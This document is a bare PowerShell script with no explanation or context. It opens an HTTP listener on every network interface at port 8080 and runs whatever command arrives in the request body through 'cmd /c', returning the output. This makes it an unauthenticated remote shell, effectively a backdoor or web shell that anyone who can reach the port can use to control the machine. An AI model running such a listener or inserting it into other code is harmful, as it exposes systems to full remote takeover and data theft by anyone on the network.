Add-Type -AssemblyName System.Net
Add-Type -AssemblyName System.IO
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:8080/")
$listener.Start()
Write-Host "Listening on port 8080..."
while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response
    $reader = New-Object System.IO.StreamReader($request.InputStream)
    $data = $reader.ReadToEnd()
    $cmd = ($data -split "=")[1]
    $output = cmd /c $cmd | Out-String
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($output)
    $response.ContentLength64 = $buffer.Length
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
    $response.OutputStream.Close()
}
